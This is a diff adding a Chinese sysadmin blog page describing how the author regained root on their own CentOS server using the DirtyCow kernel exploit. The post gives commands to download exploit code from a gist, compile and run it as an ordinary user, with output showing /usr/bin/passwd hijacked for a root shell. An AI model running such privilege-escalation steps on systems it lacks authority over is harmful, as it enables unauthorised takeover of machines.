@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next-haha.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next-haha.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next-haha.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"ming.theyan.gs","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Why开发同学在线上一台公有云的机器上调试系统环境的时候，把 &#x2F;etc&#x2F;security&#x2F;limits.conf 给改坏了，这是第二次改坏这个文件了，具体怎么改坏的，为什么改坏了会导致不能登录我单独来说（先挖坑），我这里只讲现象，这一次改坏的情况还好，只影响 root 用户，普通用户还能登录。于是就想能不能用普通用户本地提权成 root，再去修复文件 &#x2F;etc&#x2F;security&#x2F;limits.co">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一次本地提权的实战演练">
+<meta property="og:url" content="https://ming.theyan.gs/2016/11/%E4%B8%80%E6%AC%A1%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E7%9A%84%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83/index.html">
+<meta property="og:site_name" content="运维烂笔头">
+<meta property="og:description" content="Why开发同学在线上一台公有云的机器上调试系统环境的时候，把 &#x2F;etc&#x2F;security&#x2F;limits.conf 给改坏了，这是第二次改坏这个文件了，具体怎么改坏的，为什么改坏了会导致不能登录我单独来说（先挖坑），我这里只讲现象，这一次改坏的情况还好，只影响 root 用户，普通用户还能登录。于是就想能不能用普通用户本地提权成 root，再去修复文件 &#x2F;etc&#x2F;security&#x2F;limits.co">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2016-11-26T08:59:20.000Z">
+<meta property="article:modified_time" content="2019-04-04T23:47:07.014Z">
+<meta property="article:author" content="老杨">
+<meta property="article:tag" content="CentOS">
+<meta property="article:tag" content="root">
+<meta property="article:tag" content="DirtyCow">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="exploit">
+<meta property="article:tag" content="2.6.32">
+<meta property="article:tag" content="Local">
+<meta property="article:tag" content="C">
+<meta property="article:tag" content="c0w.c">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://ming.theyan.gs/2016/11/%E4%B8%80%E6%AC%A1%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E7%9A%84%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://ming.theyan.gs/2016/11/%E4%B8%80%E6%AC%A1%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E7%9A%84%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83/index.html","path":"2016/11/一次本地提权的实战演练/index.html","title":"一次本地提权的实战演练"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>一次本地提权的实战演练 | 运维烂笔头</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-106574959-2"></script>
+  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"UA-106574959-2","only_pageview":false}</script>
+  <script src="/js/third-party/analytics/google-analytics.js"></script>
+
+  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?fdef9ded31bdb8b2dab08eddebdd5fed"></script>
+
+
+
+
+
+
+<!-- google adsense -->
+<script data-ad-client="ca-pub-1045025618858716" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="运维烂笔头" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">运维烂笔头</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">一个 SA 老兵的工作日志</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-projects"><a href="/projects" rel="section"><i class="fa fa-code fa-fw"></i>projects</a></li><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Why"><span class="nav-number">1.</span> <span class="nav-text">Why</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Howto"><span class="nav-number">2.</span> <span class="nav-text">Howto</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-number">3.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">老杨</p>
+  <div class="site-description" itemprop="description">好记性比不过烂笔头</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">95</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">431</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/haw-haw" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;haw-haw" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:blog@theyan.gs" title="E-Mail → mailto:blog@theyan.gs" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/u/1494877243" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;1494877243" rel="noopener me" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/6fool" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;6fool" rel="noopener me" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://haw-haw.github.io/" title="https:&#x2F;&#x2F;haw-haw.github.io" rel="noopener" target="_blank">github 镜像站</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://hawhaw.gitee.io/" title="https:&#x2F;&#x2F;hawhaw.gitee.io" rel="noopener" target="_blank">gitee 镜像站</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ming.theyan.gs/2016/11/%E4%B8%80%E6%AC%A1%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E7%9A%84%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83/index.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="老杨">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="运维烂笔头">
+      <meta itemprop="description" content="好记性比不过烂笔头">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="一次本地提权的实战演练 | 运维烂笔头">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          一次本地提权的实战演练
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2016-11-26 16:59:20" itemprop="dateCreated datePublished" datetime="2016-11-26T16:59:20+08:00">2016-11-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2019-04-05 07:47:07" itemprop="dateModified" datetime="2019-04-05T07:47:07+08:00">2019-04-05</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="Why"><a href="#Why" class="headerlink" title="Why"></a>Why</h1><p>开发同学在线上一台公有云的机器上调试系统环境的时候，把 /etc/security/limits.conf 给改坏了，这是第二次改坏这个文件了，具体怎么改坏的，为什么改坏了会导致不能登录我单独来说（先挖坑），我这里只讲现象，这一次改坏的情况还好，只影响 root 用户，普通用户还能登录。于是就想能不能用普通用户本地提权成 root，再去修复文件 /etc/security/limits.conf </p>
+<a id="more"></a>
+<h1 id="Howto"><a href="#Howto" class="headerlink" title="Howto"></a>Howto</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum -y install wget gcc;</span><br><span class="line"><span class="comment"># 安装必需软件</span></span><br><span class="line">su - nagios;</span><br><span class="line"><span class="comment"># 切换成普通用户（nagios）</span></span><br><span class="line">id;</span><br><span class="line"><span class="comment"># 测试用户身份权限</span></span><br></pre></td></tr></table></figure>
+<p>系统输出：</p>
+<blockquote>
+<p>uid=500(nagios) gid=500(nagios) groups=500(nagios)</p>
+</blockquote>
+<p>可以看出用户 nagios 是普通用户（uid 和 gid 都是 500）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp;</span><br><span class="line"><span class="comment"># 危险动作在 /tmp 目录下做比较好</span></span><br><span class="line">wget \</span><br><span class="line">    https://gist.githubusercontent.com/KrE80r/42f8629577db95782d5e4f609f437a54/raw/71c902f55c09aa8ced351690e1e627363c231b45/c0w.c;</span><br><span class="line"><span class="comment"># 获取 exploit code</span></span><br><span class="line">gcc -pthread c0w.c -o c0w;</span><br><span class="line"><span class="comment"># 编译之</span></span><br><span class="line">./c0w;</span><br><span class="line"><span class="comment"># 执行（exploit code）</span></span><br></pre></td></tr></table></figure>
+<p>系统输出：</p>
+<blockquote>
+<p>  (<strong>_)<br>  (o o)___</strong>/<br>   @@ `     \<br>    \ ____, //usr/bin/passwd<br>    //    //<br>    ^^    ^^<br>DirtyCow root privilege escalation<br>Backing up /usr/bin/passwd to /tmp/bak<br>mmap 9c9bf000  </p>
+<p>madvise 0  </p>
+<p>ptrace 0  </p>
+</blockquote>
+<p>再执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/passwd;</span><br><span class="line">whoami;id;</span><br></pre></td></tr></table></figure>
+<p>系统提示：</p>
+<blockquote>
+<p>root<br>uid=0(root) gid=500(nagios) groups=0(root),500(nagios)  </p>
+</blockquote>
+<p>由此可以看出用户已经变成 root（uid 为 0），主组还是 nagios，但同时也已经是 root 组成员</p>
+<p>最后，记得把 /tmp/bak 恢复回去成 /usr/bin/passwd</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv /tmp/bak /usr/bin/passwd;</span><br><span class="line">chmod 4755 /usr/bin/passwd;</span><br><span class="line">chown root:root /usr/bin/passwd;</span><br></pre></td></tr></table></figure>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
+<li><a href="https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679" target="_blank" rel="noopener">CVE-2016-5195 (DirtyCow) Local Root PoC</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechat-reward.png" alt="老杨 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay-reward.png" alt="老杨 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/6fool">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/CentOS/" rel="tag"># CentOS</a>
+              <a href="/tags/root/" rel="tag"># root</a>
+              <a href="/tags/DirtyCow/" rel="tag"># DirtyCow</a>
+              <a href="/tags/Linux/" rel="tag"># Linux</a>
+              <a href="/tags/exploit/" rel="tag"># exploit</a>
+              <a href="/tags/2-6-32/" rel="tag"># 2.6.32</a>
+              <a href="/tags/Local/" rel="tag"># Local</a>
+              <a href="/tags/C/" rel="tag"># C</a>
+              <a href="/tags/c0w-c/" rel="tag"># c0w.c</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2016/11/%E4%BB%8E%E4%B8%80%E6%AC%A1%E7%94%A8cat%E7%A9%BA%E6%96%87%E4%BB%B6%E5%88%B0log%E6%96%87%E4%BB%B6%E6%9D%A5%E6%B8%85log%E6%96%B9%E6%B3%95%E7%9A%84%E5%A4%B1%E8%B4%A5%E8%AF%B4%E5%BC%80%E5%8E%BB/index.html" rel="prev" title="从一次用cat空文件到log文件来清log方法的失败说开去">
+                  <i class="fa fa-angle-left"></i> 从一次用cat空文件到log文件来清log方法的失败说开去
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2016/12/%E5%9C%A8Ubuntu14-04%E4%B8%8A%E8%87%AA%E5%BB%BALeanote%E6%9C%8D%E5%8A%A1%E5%99%A8/index.html" rel="next" title="在Ubuntu14.04上自建Leanote服务器">
+                  在Ubuntu14.04上自建Leanote服务器 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">老杨</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
